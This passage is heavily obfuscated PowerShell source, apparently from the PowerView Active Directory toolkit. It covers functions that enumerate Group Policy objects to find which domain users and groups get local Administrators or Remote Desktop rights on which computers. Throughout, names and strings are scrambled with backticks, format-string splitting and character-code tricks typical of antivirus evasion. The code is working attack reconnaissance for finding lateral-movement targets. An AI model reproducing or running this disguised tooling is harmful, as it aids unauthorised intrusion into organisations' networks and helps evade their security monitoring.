        ${s`Plito`PTiON} =  ( &("{2}{1}{0}"-f 'aBlE','aRi','V') ("{1}{0}" -f '4','25F') )."V`ALue"::"remO`V`eemPTYenT`Ri`es"
    }

    PROCESS {
        if (${pSbouND`P`ARameTe`RS}[("{1}{0}{2}"-f 'd','I','entity')]) { ${sEaRc`H`er`ARGuMeNTs}[("{2}{0}{1}"-f't','y','Identi')] = ${iDen`TI`TY} }

        &("{2}{3}{1}{0}{4}" -f 'P','nG','Get-Doma','i','O') @SearcherArguments | &("{1}{3}{0}{2}"-f'h-O','ForE','bject','ac') {
            ${GPo`dI`S`pL`AYNaME} = ${_}."DiS`pLaYn`Ame"
            ${GPoN`AME} = ${_}."NA`me"
            ${GP`oPA`TH} = ${_}."gpCfILE`s`YsP`ATh"

            ${PaR`S`EArgs} =  @{ ("{2}{1}{0}{3}"-f 'Pa','l','GptTmp','th') = ("$GPOPath\MACHINE\Microsoft\Windows "+('N'+'T0'+'IgS'+'ecEdit'+'0Ig'+'Gpt'+'Tmp'+'l.in'+'f')."re`PlaCe"(([CHAR]48+[CHAR]73+[CHAR]103),[stRING][CHAR]92)) }
            if (${PSbOu`NdpaR`Am`Ete`RS}[("{1}{2}{0}"-f 'tial','Cred','en')]) { ${pArse`Ar`gs}[("{0}{2}{1}" -f'Cred','al','enti')] = ${c`R`ED`ENtIAl} }

            
            ${i`Nf} = &("{1}{3}{2}{0}"-f 'l','Get-G','Tmp','pt') @ParseArgs

            if (${I`Nf} -and (${I`Nf}."p`SbaSe"."kE`YS" -contains ("{0}{2}{1}{3}"-f'Gro','embers','up M','hip'))) {
                ${Mem`BE`RsHIps} = @{}

                
                ForEach (${MeMBEr`S`hIP} in ${i`NF}.'Group Membership'.("{0}{2}{1}{3}{4}"-f 'Get','num','E','erat','or').Invoke()) {
                    ${gRo`UP}, ${r`E`laTiOn} = ${m`e`MBeRShIp}."K`eY".("{1}{0}" -f 'lit','Sp').Invoke('__', ${S`pLi`T`OptION}) | &("{2}{3}{1}{0}{4}"-f'-Obj','h','For','Eac','ect') {${_}.("{1}{0}" -f'im','Tr').Invoke()}
                    
                    ${M`Em`Ber`ShiPVAL`Ue} = ${mEMBe`R`SHIp}."V`AluE" | &("{0}{3}{1}{2}"-f 'Wh','e-Obj','ect','er') {${_}} | &("{2}{3}{4}{0}{1}"-f'b','ject','F','orEach-','O') { ${_}.("{0}{1}"-f 'Tr','im').Invoke('*') } | &("{0}{2}{1}" -f 'Where-O','ect','bj') {${_}}

                    if (${p`SbOUNdPara`me`T`ERS}[("{0}{4}{2}{1}{5}{3}"-f'Resolv','rsT','e','s','eMemb','oSID')]) {
                        
                        ${GR`O`UPMEmbErS} = @()
                        ForEach (${M`EmBeR} in ${mEm`BeRshipV`Al`UE}) {
                            if (${M`EM`BER} -and (${ME`mBER}.("{0}{1}"-f'T','rim').Invoke() -ne '')) {
                                if (${MeMB`eR} -notmatch ("{0}{1}"-f '^','S-1-.*')) {
                                    ${cONv`E`RTTOA`RG`Ume`NTS} = @{("{0}{1}{2}"-f'Obje','ctNa','me') = ${m`EMbEr}}
                                    if (${P`s`BOundpa`RAMet`ERS}[("{0}{1}" -f 'Do','main')]) { ${cO`NverTToArg`Umen`TS}[("{1}{0}" -f 'n','Domai')] = ${dO`MAIn} }
                                    ${MEmB`E`Rsid} = &("{1}{2}{0}"-f 'ertTo-SID','Co','nv') @ConvertToArguments

                                    if (${mEM`BeR`SId}) {
                                        ${gro`U`PmeMbe`Rs} += ${MEMB`e`RS`ID}
                                    }
                                    else {
                                        ${gr`oUPmemb`E`RS} += ${mEMb`ER}
                                    }
                                }
                                else {
                                    ${gRoUp`m`EMB`eRs} += ${meM`B`er}
                                }
                            }
                        }
                        ${M`embeR`sHi`pv`Alue} = ${g`R`OuP`mEM`BErS}
                    }

                    if (-not ${m`eMB`ErSHiPs}[${Gr`Oup}]) {
                        ${M`EMB`eR`shIps}[${g`ROuP}] = @{}
                    }
                    if (${M`E`mb`e`RSHipVaLue} -isnot [System.Array]) {${MemBersHi`P`VA`l`Ue} = @(${ME`mBer`S`hiPVAl`UE})}
                    ${m`EmBER`shIPS}[${GRo`Up}].("{0}{1}" -f'A','dd').Invoke(${RElA`TIon}, ${M`eMbe`RshIp`V`AlUE})
                }

                ForEach (${m`e`MBeRSHiP} in ${mEMBErS`hi`ps}.("{0}{2}{1}"-f'GetE','ator','numer').Invoke()) {
                    if (${ME`Mb`ERSHiP} -and ${MEMB`e`R`shIp}."k`Ey" -and (${m`em`B`ersHIP}."k`eY" -match '^\*')) {
                        
                        ${g`R`OUpSid} = ${ME`M`B`ErSHIP}."k`Ey".("{1}{0}"-f'rim','T').Invoke('*')
                        if (${G`RoUp`Sid} -and (${gR`oUP`S`ID}.("{0}{1}"-f 'T','rim').Invoke() -ne '')) {
                            ${GRoU`P`NAME} = &("{4}{1}{2}{3}{0}"-f'D','From','-S','I','Convert') -ObjectSID ${gROUpS`Id} @ConvertArguments
                        }
                        else {
                            ${G`ROUpNa`mE} = ${fAL`SE}
                        }
                    }
                    else {
                        ${gROU`PN`Ame} = ${M`E`mBerSH`IP}."K`ey"

                        if (${GROU`p`Name} -and (${GRoup`Na`ME}.("{0}{1}" -f'Tr','im').Invoke() -ne '')) {
                            if (${GrouP`N`AmE} -match ("{1}{0}{3}{2}" -f 't','Adminis','s','rator')) {
                                ${g`R`OupsiD} = ("{0}{1}{2}"-f'S','-1','-5-32-544')
                            }
                            elseif (${Group`Na`mE} -match ("{0}{1}{2}{3}" -f 'Remote',' Deskt','o','p')) {
                                ${Gr`oUPs`ID} = ("{1}{3}{2}{0}"-f '5','S','2-55','-1-5-3')
                            }
                            elseif (${g`RO`UPna`mE} -match ("{0}{1}"-f'G','uests')) {
                                ${gRouP`S`Id} = ("{1}{2}{0}"-f'2-546','S','-1-5-3')
                            }
                            elseif (${gRou`p`NaMe}.("{0}{1}" -f'T','rim').Invoke() -ne '') {
                                ${COn`Ver`TToaRGUMe`Nts} = @{("{1}{3}{2}{0}"-f 'Name','O','ect','bj') = ${GRO`UPnA`me}}
                                if (${pS`BoUNdPA`RA`ME`TERS}[("{0}{1}"-f'Doma','in')]) { ${conVeR`TTOA`RGu`mentS}[("{0}{2}{1}"-f'D','ain','om')] = ${D`OMA`IN} }
                                ${G`Roup`SiD} = &("{0}{3}{1}{2}"-f'Con','o-SI','D','vertT') @ConvertToArguments
                            }
                            else {
                                ${gROU`Ps`ID} = ${nu`Ll}
                            }
                        }
                    }

                    ${gPO`GrouP} = &("{2}{1}{0}"-f 'w-Object','e','N') ("{2}{1}{0}"-f'ect','j','PSOb')
                    ${gpoG`RoUp} | &("{2}{3}{0}{1}" -f'mb','er','Add-','Me') ("{0}{3}{2}{1}" -f'Note','erty','rop','p') ("{1}{0}{2}"-f 'isplayNam','GPOD','e') ${GPoDiSpl`A`ynaMe}
                    ${GpoGR`Oup} | &("{1}{3}{0}{2}"-f'mbe','Ad','r','d-Me') ("{0}{2}{1}" -f'Notep','y','ropert') ("{1}{0}{2}"-f 'N','GPO','ame') ${gP`O`NAMe}
                    ${g`pO`GROUp} | &("{0}{1}{3}{2}" -f'A','d','-Member','d') ("{0}{3}{2}{1}" -f 'No','perty','ro','tep') ("{1}{0}"-f'POPath','G') ${Gpo`pA`Th}
                    ${GPOgr`ouP} | &("{0}{2}{1}"-f'Add-Memb','r','e') ("{2}{1}{0}" -f 'erty','oteprop','N') ("{0}{2}{1}"-f 'GP','pe','OTy') ("{1}{2}{0}{3}"-f'c','Rest','ri','tedGroups')
                    ${g`PogR`oup} | &("{0}{2}{1}"-f'Add-Memb','r','e') ("{1}{0}{2}" -f'teprope','No','rty') ("{0}{1}"-f'Filt','ers') ${NU`LL}
                    ${Gpo`gr`o`Up} | &("{2}{1}{0}" -f 'ber','m','Add-Me') ("{2}{0}{3}{1}" -f'prop','ty','Note','er') ("{2}{3}{1}{0}"-f'me','upNa','G','ro') ${GR`o`UPnaMe}
                    ${gPOgro`UP} | &("{1}{0}{2}" -f 'embe','Add-M','r') ("{3}{0}{1}{2}" -f 'ope','r','ty','Notepr') ("{2}{0}{1}" -f 'oupS','ID','Gr') ${g`ROuP`sId}
                    ${g`p`og`Roup} | &("{2}{1}{0}{3}"-f'embe','d-M','Ad','r') ("{0}{1}{2}{3}" -f'Note','p','r','operty') ("{2}{1}{0}{3}" -f'Membe','up','Gro','rOf') ${memb`ERSH`IP}."vA`LuE"."m`E`mBEROf"
                    ${GPo`gR`oUp} | &("{2}{0}{1}" -f'emb','er','Add-M') ("{1}{0}{2}"-f 'e','Not','property') ("{0}{2}{1}"-f'Grou','embers','pM') ${mEMbE`R`shIP}."VAl`Ue"."M`EMBerS"
                    ${G`p`og`ROUP}."p`S`OBjECt"."tYPE`N`AMes".("{0}{2}{1}"-f'I','t','nser').Invoke(0, ("{0}{3}{4}{2}{1}"-f'Po','GPOGroup','.','wer','View'))
                    ${gPog`R`OUP}
                }
            }

            
            ${PA`RsE`A`RGS} =  @{
                ("{1}{3}{2}{0}"-f'h','GroupsXML','t','pa') = "$GPOPath\MACHINE\Preferences\Groups\Groups.xml"
            }

            &("{2}{1}{0}"-f'L','sXM','Get-Group') @ParseArgs | &("{0}{2}{1}" -f'Fo','ect','rEach-Obj') {
                if (${ps`BouN`DpAR`AmEtERS}[("{3}{4}{1}{5}{6}{2}{0}" -f 'Ds','emb','oSI','Resolve','M','e','rsT')]) {
                    ${GroupMEm`Be`Rs} = @()
                    ForEach (${mE`M`BER} in ${_}."G`RouPMEM`B`ERs") {
                        if (${MEmb`er} -and (${MEM`B`ER}.("{1}{0}" -f'rim','T').Invoke() -ne '')) {
                            if (${me`mB`er} -notmatch ("{0}{1}" -f '^S-1','-.*')) {

                                
                                ${CONvERT`TO`ARguME`N`Ts} = @{("{1}{2}{0}"-f'ctName','Obj','e') = ${G`R`OupNaMe}}
                                if (${P`sb`oUNDpa`R`AmETERS}[("{1}{0}"-f 'in','Doma')]) { ${CON`VEr`T`Toa`RGumeN`TS}[("{0}{1}"-f'D','omain')] = ${d`Oma`in} }
                                ${Me`m`BerSID} = &("{2}{3}{0}{4}{1}" -f'o','SID','C','onvertT','-') -Domain ${d`Om`AIN} -ObjectName ${meM`BeR}

                                if (${m`em`BErs`ID}) {
                                    ${GrOup`ME`mBErs} += ${ME`MBERS`ID}
                                }
                                else {
                                    ${gRO`U`pMeMBERs} += ${mE`Mb`er}
                                }
                            }
                            else {
                                ${grOUp`meMBe`RS} += ${M`EMbER}
                            }
                        }
                    }
                    ${_}."Gr`o`UP`MEmbeRs" = ${g`RouPM`EM`BeRs}
                }

                ${_} | &("{1}{0}{2}"-f'-Me','Add','mber') ("{0}{3}{1}{2}"-f 'Notepro','r','ty','pe') ("{2}{0}{1}" -f 's','playName','GPODi') ${g`Po`D`iSplaynaME}
                ${_} | &("{0}{1}{2}" -f'Add-Mem','be','r') ("{0}{1}{2}{3}"-f 'N','ot','eprop','erty') ("{0}{1}"-f'GPON','ame') ${g`Po`NAME}
                ${_} | &("{0}{2}{1}" -f 'A','Member','dd-') ("{1}{2}{0}{3}"-f 'propert','No','te','y') ("{0}{1}{2}" -f 'G','P','OType') ("{1}{4}{3}{0}{2}"-f'yPrefere','Gr','nces','lic','oupPo')
                ${_}."P`SoB`jECT"."t`y`pE`NAmES".("{0}{1}" -f'Inse','rt').Invoke(0, ("{2}{0}{3}{4}{1}"-f 'rV','oup','Powe','iew.GPOG','r'))
                ${_}
            }
        }
    }
}


function GEt-DOM`AIngPoUSERlo`cALGR`O`U`p`MA`ppi`Ng {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{1}{0}"-f'ouldProcess','h','PSS'}, '')]
    [OutputType({"{0}{3}{5}{1}{6}{4}{2}" -f'Po','ie','GroupMapping','wer','serLocal','V','w.GPOU'})]
    [CmdletBinding()]
    Param(
        [Parameter(poSITiOn = 0, vALuEFrompIPElInE = ${t`RUE}, vAluEfrOMpIpELInebYpRoPeRTyNaME = ${tr`UE})]
        [Alias({"{2}{0}{4}{1}{3}{5}" -f'ti','uishedN','Dis','a','ng','me'}, {"{1}{3}{0}{2}"-f'ntNa','SamAcco','me','u'}, {"{1}{0}" -f'e','Nam'})]
        [String]
        ${id`eNTi`TY},

        [String]
        [ValidateSet({"{4}{1}{3}{0}{2}"-f 'rato','i','rs','nist','Adm'}, {"{1}{0}{2}"-f'-32','S-1-5','-544'}, 'RDP', {"{2}{3}{4}{5}{6}{1}{0}"-f'ers','Us','Rem','ot','e ','Desk','top '}, {"{2}{3}{0}{1}" -f'5','5','S-','1-5-32-5'})]
        ${LoC`AL`gR`Oup} = ("{0}{2}{3}{1}"-f 'A','trators','dm','inis'),

        [ValidateNotNullOrEmpty()]
        [String]
        ${dOM`A`in},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f'ADSPat','h'})]
        [String]
        ${sea`RCHb`A`se},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{3}{2}" -f 'mai','Do','ller','nContro'})]
        [String]
        ${seRV`er},

        [ValidateSet({"{1}{0}" -f 'e','Bas'}, {"{1}{2}{0}" -f 'l','One','Leve'}, {"{1}{2}{0}" -f 'btree','S','u'})]
        [String]
        ${S`E`ArcHSCo`Pe} = ("{2}{1}{0}" -f 'e','tre','Sub'),

        [ValidateRange(1, 10000)]
        [Int]
        ${r`es`ULtpag`eSIZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SEr`V`ErtimElIMit},

        [Switch]
        ${T`o`mBS`ToNE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cr`e`dEnti`AL} =  (&("{0}{1}{2}"-f 'vari','AB','Le') ("{0}{1}" -f '5r0','vk') )."v`Alue"::"EM`pTy"
    )

    BEGIN {
        ${CO`mmON`ARG`U`MEnTs} = @{}
        if (${pSBOu`Nd`p`A`RamEte`RS}[("{1}{0}" -f 'main','Do')]) { ${Co`M`MOnaRGUm`eNTS}[("{0}{2}{1}" -f'Dom','in','a')] = ${dOMa`iN} }
        if (${PsboUndP`AR`A`metErs}[("{1}{2}{0}" -f 'er','S','erv')]) { ${cOmMon`Arg`U`mEn`Ts}[("{1}{0}" -f 'r','Serve')] = ${s`eRVEr} }
        if (${PSB`ounDPAR`Am`Ete`Rs}[("{0}{3}{1}{2}"-f'Sea','p','e','rchSco')]) { ${CoM`m`OnAR`gumEnts}[("{0}{2}{1}"-f 'S','chScope','ear')] = ${Se`A`RcH`SCOpe} }
        if (${pSBO`UNDPA`RAM`etErs}[("{0}{1}{2}{3}" -f 'Result','P','ageSiz','e')]) { ${Com`mO`NAR`guMe`Nts}[("{2}{1}{0}{3}" -f 'geSi','esultPa','R','ze')] = ${reS`U`Ltp`AgESIZe} }
        if (${pSB`o`UNDP`ArAM`e`TerS}[("{2}{1}{0}{3}"-f 'm','erTimeLi','Serv','it')]) { ${c`OMMonaR`Gu`ME`NTs}[("{0}{2}{1}{3}" -f 'Se','verTi','r','meLimit')] = ${serVEr`TI`me`liMIT} }
        if (${psbOuN`D`parAM`etErS}[("{2}{0}{1}" -f'ombston','e','T')]) { ${CommO`N`ARg`UMENTS}[("{1}{0}"-f'tone','Tombs')] = ${tom`Bst`oNe} }
        if (${psBOuN`dPAr`Ame`TeRs}[("{0}{1}{2}"-f 'C','redentia','l')]) { ${c`oM`moN`ARgUm`Ents}[("{0}{1}{2}" -f 'Cred','enti','al')] = ${cr`e`d`entIaL} }
    }

    PROCESS {
        ${ta`RGEt`siDS} = @()

        if (${p`sboUNDpAR`A`METERS}[("{2}{0}{1}" -f 'd','entity','I')]) {
            ${t`ARg`etsi`Ds} += &("{4}{3}{0}{1}{2}"-f'O','bje','ct','main','Get-Do') @CommonArguments -Identity ${Ide`N`TIty} | &("{0}{2}{1}"-f 'Selec','ct','t-Obje') -Expand ("{1}{0}" -f 'tsid','objec')
            ${t`ArgeTobje`CTS`iD} = ${T`A`RGeT`siDs}
            if (-not ${tARg`eTsI`DS}) {
                Throw ('[Get-Dom'+'a'+'in'+'GPO'+'Use'+'r'+'LocalGrou'+'p'+'Mapp'+'ing]'+' '+'Un'+'able '+'to'+' '+'retr'+'ie'+'ve '+'S'+'ID '+'f'+'or '+'identit'+'y'+' '+"'$Identity'")
            }
        }
        else {
            
            ${Ta`RGe`Ts`idS} = @('*')
        }

        if (${l`oca`LGrOUP} -match ("{1}{0}"-f'-5','S-1')) {
            ${tARg`E`TLOCA`LSID} = ${Lo`Ca`L`gRouP}
        }
        elseif (${loCa`L`GR`oUp} -match ("{0}{1}"-f 'A','dmin')) {
            ${TARG`EtlO`C`ALSiD} = ("{3}{1}{2}{0}"-f'544','2','-','S-1-5-3')
        }
        else {
            
            ${TaRGe`TLOca`L`siD} = ("{2}{3}{0}{1}" -f'5','55','S','-1-5-32-')
        }

        if (${TArg`eTS`idS}[0] -ne '*') {
            ForEach (${t`ArGE`TsId} in ${TA`RgETs`idS}) {
                &("{2}{4}{0}{1}{3}" -f'te-','V','W','erbose','ri') ('['+'Get-Do'+'mainG'+'P'+'OUser'+'LocalGroup'+'Mapp'+'i'+'n'+'g] '+'E'+'numerat'+'ing '+'n'+'este'+'d '+'grou'+'p '+'me'+'mbe'+'rships '+'f'+'or: '+"'$TargetSid'")
                ${tARG`ets`IdS} += &("{4}{1}{2}{3}{0}" -f 'oup','t-D','o','mainGr','Ge') @CommonArguments -Properties ("{0}{1}{2}"-f 'obj','ects','id') -MemberIdentity ${T`A`RGetsiD} | &("{2}{1}{0}"-f '-Object','elect','S') -ExpandProperty ("{0}{1}" -f 'object','sid')
            }
        }

        &("{2}{1}{0}" -f'Verbose','te-','Wri') ('[Ge'+'t-Dom'+'a'+'inGPOUs'+'er'+'L'+'ocalGroup'+'Mapp'+'ing]'+' '+'Tar'+'get '+'loca'+'l'+'g'+'roup '+'S'+'ID: '+"$TargetLocalSID")
        &("{0}{1}{2}"-f'Write-V','e','rbose') ('[Get-'+'Doma'+'i'+'nGPOUserL'+'oc'+'alGroup'+'Map'+'pi'+'ng] '+'Effect'+'ive'+' '+'ta'+'rget '+'d'+'omain'+' '+'SIDs'+':'+' '+"$TargetSIDs")

        ${GPO`Gr`OUPS} = &("{2}{4}{3}{5}{1}{0}"-f'Group','Local','Get-Domain','P','G','O') @CommonArguments -ResolveMembersToSIDs | &("{2}{1}{3}{0}"-f 'bject','or','F','Each-O') {
            ${GpO`Gro`UP} = ${_}
            
            if (${g`p`OGROup}."g`ROU`psid" -match ${taR`geTl`Oc`AlsId}) {
                ${GPoG`R`OUp}."gRoUpmE`MB`eRS" | &("{0}{2}{1}"-f 'Whe','Object','re-') {${_}} | &("{0}{4}{2}{1}{3}" -f'F','bjec','ach-O','t','orE') {
                    if ( (${Targ`e`TSi`DS}[0] -eq '*') -or (${T`ARgETS`idS} -Contains ${_}) ) {
                        ${GP`OgR`oUp}
                    }
                }
            }
            
            if ( (${g`PoG`RO`Up}."GrOUPm`embE`ROf" -contains ${TAR`GET`LocAls`id}) ) {
                if ( (${t`ArgET`s`IdS}[0] -eq '*') -or (${tA`R`g`ETSIdS} -Contains ${Gpogro`Up}."gROuPS`ID") ) {
                    ${G`POgrO`UP}
                }
            }
        } | &("{0}{1}{2}" -f 'Sor','t-Objec','t') -Property ("{1}{2}{0}" -f'e','G','PONam') -Unique

        ${gpOGr`o`U`Ps} | &("{2}{1}{3}{0}" -f 'ct','her','W','e-Obje') {${_}} | &("{1}{3}{2}{0}"-f 'Object','For','h-','Eac') {
            ${G`poNA`mE} = ${_}."gP`ODIS`PL`AynaMe"
            ${Gpo`g`UId} = ${_}."G`PON`AMe"
            ${G`P`opATH} = ${_}."g`poPA`Th"
            ${GPO`T`yPE} = ${_}."gpoT`y`PE"
            if (${_}."gr`O`UpmeMBerS") {
                ${G`p`o`meMBErs} = ${_}."gRO`U`PMeMBers"
            }
            else {
                ${gPOm`E`mb`ERs} = ${_}."grOUPS`iD"
            }

            ${fI`lTE`Rs} = ${_}."fiL`TerS"

            if (${tAr`GETs`ids}[0] -eq '*') {
                
                ${tA`RGEToBjEC`TsI`Ds} = ${GpOmeMb`E`RS}
            }
            else {
                ${tArgetO`BJEc`T`SIDs} = ${ta`RGetOBJect`s`id}
            }

            
            &("{0}{3}{1}{2}" -f 'G','O','U','et-Domain') @CommonArguments -Raw -Properties ("{0}{1}{6}{2}{4}{3}{5}" -f 'nam','e','u','ed','ish','name',',disting') -GPLink ${G`PoGuiD} | &("{3}{0}{1}{4}{2}" -f'Eac','h','ct','For','-Obje') {
                if (${fi`lT`ERS}) {
                    ${Ou`compUTe`RS} = &("{5}{1}{2}{0}{3}{4}" -f'Com','t-D','omain','pute','r','Ge') @CommonArguments -Properties ("{3}{2}{6}{0}{4}{5}{1}"-f 'stingui','e','sh','dn','shed','nam','ostname,di') -SearchBase ${_}."Pa`TH" | &("{2}{0}{1}"-f'e-Objec','t','Wher') {${_}."Dist`INg`UiS`hE`dNaME" -match (${FI`LteRS}."V`ALue")} | &("{0}{1}{3}{2}"-f'Sele','c','bject','t-O') -ExpandProperty ("{2}{0}{3}{1}" -f'ns','stname','d','ho')
                }
                else {
                    ${Ou`C`OM`puTeRS} = &("{3}{4}{2}{0}{1}" -f 'i','nComputer','a','Get-Do','m') @CommonArguments -Properties ("{3}{0}{2}{1}" -f 'nsh','tname','os','d') -SearchBase ${_}."P`ATH" | &("{2}{3}{0}{1}"-f'e','ct','Sel','ect-Obj') -ExpandProperty ("{1}{0}{3}{2}"-f'ns','d','me','hostna')
                }

                if (${O`U`c`OmPUtErS}) {
                    if (${OucO`mp`UTerS} -isnot [System.Array]) {${Ou`CoMPUT`ERS} = @(${Ou`Co`m`pUTers})}

                    ForEach (${taR`get`S`iD} in ${T`Arg`E`ToBje`cts`iDS}) {
                        ${o`BjE`Ct} = &("{4}{2}{1}{3}{0}"-f'ainObject','Do','-','m','Get') @CommonArguments -Identity ${TAR`g`etsID} -Properties ("{0}{2}{9}{11}{3}{5}{6}{10}{7}{1}{8}{4}" -f 'sama','jec','ccou','e,samaccoun','id','tnam','e,disti','ishedname,ob','ts','ntt','ngu','yp')

                        ${Is`G`Roup} = @(("{1}{0}{2}"-f '4','268','35456'),("{2}{1}{0}"-f'5457','843','26'),("{1}{0}{2}{3}" -f'87','536','091','2'),("{2}{1}{0}"-f'0913','7','5368')) -contains ${oBj`E`Ct}."SAMaCC`o`UN`TT`YpE"

                        ${g`p`oLoCa`LGR`OupMappi`NG} = &("{2}{0}{3}{1}"-f 'w-Obj','ct','Ne','e') ("{2}{0}{1}" -f 'bje','ct','PSO')
                        ${Gp`OlOCal`grOUpMa`pP`i`NG} | &("{0}{2}{1}"-f 'A','Member','dd-') ("{2}{1}{0}" -f 'y','rt','Noteprope') ("{2}{1}{0}"-f 'e','ctNam','Obje') ${OB`je`Ct}."sAM`Acc`O`UNTn`AMe"
                        ${g`pOlocalG`Roupm`A`pP`INg} | &("{2}{1}{0}"-f 'r','dd-Membe','A') ("{3}{2}{1}{0}"-f'ty','r','e','Noteprop') ("{1}{0}"-f 'ectDN','Obj') ${o`B`jECt}."dI`s`TingUis`hE`Dn`AME"
                        ${gP`OL`OcaL`GROupMAP`pING} | &("{0}{2}{1}"-f 'A','Member','dd-') ("{1}{2}{3}{0}" -f 'y','No','teproper','t') ("{0}{2}{1}"-f'O','ectSID','bj') ${oBJ`Ect}."obJEc`T`SID"
                        ${gp`OL`OCAlgR`oUpmApp`ing} | &("{2}{0}{1}" -f 'dd-Me','mber','A') ("{0}{1}{2}{3}"-f'Not','eproper','t','y') ("{0}{1}{2}"-f'Do','mai','n') ${doM`A`In}
                        ${GPOloCAl`GROuP`mAP`pinG} | &("{2}{1}{0}{3}" -f 'mb','d-Me','Ad','er') ("{1}{2}{0}" -f'ty','Noteprope','r') ("{1}{2}{0}" -f 'p','IsGro','u') ${IS`gro`Up}
                        ${gPoloCAl`gR`oupMaPp`i`NG} | &("{2}{0}{1}{3}"-f 'dd-Mem','be','A','r') ("{1}{2}{0}" -f 'erty','Notepro','p') ("{3}{0}{1}{4}{2}"-f'PODispl','ay','ame','G','N') ${GpOn`A`mE}
                        ${GpO`Lo`c`AlgROU`Pm`Apping} | &("{0}{1}{2}" -f'Add-','Mem','ber') ("{2}{0}{1}" -f'oteprope','rty','N') ("{1}{0}" -f'id','GPOGu') ${GP`og`UID}
                        ${g`poloCaLGr`oU`p`ma`ppiNG} | &("{3}{0}{1}{2}" -f 'd-','Me','mber','Ad') ("{0}{3}{1}{2}"-f'N','oper','ty','otepr') ("{1}{2}{0}" -f 'ath','GP','OP') ${GpOp`ATH}
                        ${GPoLO`CALGRoUP`MApP`ING} | &("{1}{0}{3}{2}"-f '-Mem','Add','er','b') ("{0}{1}{2}{3}"-f'N','otepr','op','erty') ("{0}{1}{2}" -f'G','POTy','pe') ${G`Po`TyPe}
                        ${GPo`lOCAlGr`o`U`pMa`PPinG} | &("{1}{0}{2}"-f'Me','Add-','mber') ("{0}{1}{2}" -f 'Notepro','pe','rty') ("{0}{1}{2}"-f'Contain','erNa','me') ${_}."prop`Er`T`IeS"."dISTINgU`I`She`dNAME"
                        ${g`p`Ol`oc`AlGR`oup`mAppING} | &("{0}{2}{1}" -f 'Add','mber','-Me') ("{1}{2}{0}" -f 'rty','N','oteprope') ("{3}{0}{1}{2}"-f'ompu','terNa','me','C') ${O`Uco`mPute`Rs}
                        ${G`pO`LOCaLGrOUp`MaPPi`Ng}."p`sO`BjECt"."TyP`enAMES".("{1}{0}" -f 'ert','Ins').Invoke(0, ("{3}{4}{2}{6}{7}{1}{5}{0}{8}"-f 'LocalG','w.GP','r','Pow','e','O','Vi','e','roupMapping'))
                        ${gpoLO`c`ALGRO`UpmaPpiNg}
                    }
                }
            }

            
            &("{3}{1}{0}{2}"-f'ai','t-Dom','nSite','Ge') @CommonArguments -Properties ("{4}{0}{2}{3}{1}{5}{6}" -f'bl,d','sh','ist','ingui','siteobject','ednam','e') -GPLink ${GP`oGU`iD} | &("{2}{3}{0}{1}"-f 'bjec','t','ForEach-','O') {
                ForEach (${tAr`G`etSiD} in ${t`AR`geTObje`c`TSiDs}) {
                    ${obje`Ct} = &("{2}{0}{4}{3}{1}" -f 't-','ct','Ge','ainObje','Dom') @CommonArguments -Identity ${Tar`g`EtsiD} -Properties ("{8}{6}{0}{4}{1}{14}{3}{7}{2}{9}{12}{10}{11}{5}{13}" -f 'co','ttyp','ingu','samaccountname,di','un','name,o','amac','st','s','i','e','d','sh','bjectsid','e,')

                    ${i`S`gROUp} = @(("{1}{0}"-f'68435456','2'),("{2}{0}{1}"-f'84354','57','26'),("{0}{1}{2}"-f'53','687091','2'),("{0}{2}{1}" -f'5','6870913','3')) -contains ${OBjE`ct}."SAMA`CcOU`NTtY`pE"

                    ${GPOL`ocA`lG`RoUpmapP`InG} = &("{2}{0}{1}"-f 'w-Ob','ject','Ne') ("{0}{1}" -f 'PSO','bject')
                    ${GPoloc`ALGr`Oup`M`Ap`PINg} | &("{1}{2}{0}"-f 'mber','Ad','d-Me') ("{0}{3}{2}{1}" -f 'Note','rty','e','prop') ("{1}{2}{0}{3}"-f'am','Objec','tN','e') ${obj`e`CT}."sAmaCC`OU`N`TnA`Me"
                    ${GPolocaLGRo`UP`MaP`P`ing} | &("{0}{2}{1}" -f'Add-','ember','M') ("{1}{0}{3}{2}"-f'op','Notepr','rty','e') ("{1}{0}{2}"-f'ct','Obje','DN') ${ObjE`ct}."DI`sti`NGU`i`sheDNA`mE"
                    ${G`Po`l`OCAL`g`RoUpMa`pPing} | &("{0}{1}{2}"-f 'Add-Mem','b','er') ("{1}{2}{0}{3}"-f 'pro','No','te','perty') ("{0}{1}{2}"-f 'Obje','ctSI','D') ${o`BJeCt}."ObJ`Ec`TSID"
                    ${gPOloCa`LgR`O`U`PMA`pping} | &("{1}{0}{3}{2}"-f 'd-M','Ad','mber','e') ("{0}{3}{2}{1}"-f 'N','erty','p','otepro') ("{1}{0}{2}" -f 'sG','I','roup') ${Isg`R`OuP}
                    ${GP`OLO`caLgROU`PMa`P`PinG} | &("{1}{2}{0}" -f'ber','Add','-Mem') ("{3}{2}{0}{1}"-f 'opert','y','pr','Note') ("{0}{1}"-f'Doma','in') ${Dom`A`In}
                    ${GpOlocALGro`U`P`mAPP`ing} | &("{1}{0}{2}{3}"-f 'd-M','Ad','e','mber') ("{0}{1}{2}"-f'Not','ep','roperty') ("{0}{3}{2}{1}" -f 'GPO','ame','layN','Disp') ${G`pO`NamE}
                    ${g`PolOCAlg`R`oupMAPPi`NG} | &("{1}{0}{2}" -f 'Memb','Add-','er') ("{0}{3}{2}{1}" -f'Note','ty','per','pro') ("{1}{0}"-f'id','GPOGu') ${GPog`U`Id}
                    ${GPo`LoCA`L`g`RO`U`PmaPpinG} | &("{1}{2}{0}"-f 'r','Add-M','embe') ("{2}{0}{3}{1}" -f'p','erty','Note','rop') ("{2}{0}{1}" -f 'a','th','GPOP') ${g`p`oPath}
                    ${g`pOlOC`AlGro`Up`M`ApP`ing} | &("{1}{2}{0}"-f 'Member','A','dd-') ("{2}{0}{1}{3}"-f 'ot','eprope','N','rty') ("{2}{0}{1}" -f 'POT','ype','G') ${G`Poty`PE}
                    ${g`PoLocA`lGr`oupmaPp`i`Ng} | &("{2}{1}{0}"-f'mber','Me','Add-') ("{2}{1}{0}{3}"-f 'rt','prope','Note','y') ("{2}{1}{0}"-f 'Name','ainer','Cont') ${_}."DistiNG`UIsh`ed`N`AMe"
